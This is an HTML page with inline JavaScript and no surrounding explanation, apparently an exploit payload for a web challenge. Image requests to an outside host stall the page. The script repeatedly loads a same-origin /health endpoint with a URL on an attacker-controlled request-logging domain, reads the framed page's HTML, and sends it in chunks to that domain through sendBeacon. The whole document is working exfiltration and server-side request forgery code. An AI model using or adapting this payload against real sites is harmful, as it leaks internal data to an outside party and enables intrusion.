<iframe src="about:blank" id="ifrm"></iframe>

<img src="//sleep.babelo.xyz/180?1">
<img src="//sleep.babelo.xyz/180?2">
<img src="//sleep.babelo.xyz/180?3">
<img src="//sleep.babelo.xyz/180?4">
<img src="//sleep.babelo.xyz/180?5">
<img src="//sleep.babelo.xyz/180?6">

<script async>

let REQUESTREPO_DOMAIN = "{{REQUESTREPO}}";
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
(async () => {
    const CHUNK_SIZE = 8 * 1024;
    for (let i = 0; i < 1000; i++) {
        let res;
        try {
            ifrm.src = `/health?url=http://${REQUESTREPO_DOMAIN}:8002/crash`;
            navigator.sendBeacon(`http://${REQUESTREPO_DOMAIN}:8002/log`, "waiting to load");
            await new Promise((resolve, reject) => {
                ifrm.onload = resolve;
                ifrm.onerror = () => reject(new Error("iframe failed to load"));
            });
            await sleep(500);
            res = window.frames[0].document.documentElement.outerHTML
            console.log(res);
            await sleep(500);
            ifrm.src = `about:blank`;
        } catch (e) {
            res = `error: ${e}`;
        }

        navigator.sendBeacon(`http://${REQUESTREPO_DOMAIN}:8002/log`, `${res.slice(0,1024)} while fetching http://internal.${REQUESTREPO_DOMAIN}:8002/health?url=http://${REQUESTREPO_DOMAIN}:8002/crash -> ${window.origin} ${window.location.href}`);


        if(res.search("SKIP_ME") == -1 && res.search("Failed to fetch") == -1){
            for (let offset = 0; offset < res.length; offset += CHUNK_SIZE) {
                const chunk = res.slice(offset, offset + CHUNK_SIZE);
                navigator.sendBeacon(`http://${REQUESTREPO_DOMAIN}:8002/log?count=${offset / CHUNK_SIZE + 1}`, chunk);
                
                await sleep(500);
            }

            navigator.sendBeacon(`http://${REQUESTREPO_DOMAIN}:8002/log?&end=1`, "dsadsadsa");

            return;
        }

        await sleep(5000);
    }
})();

</script>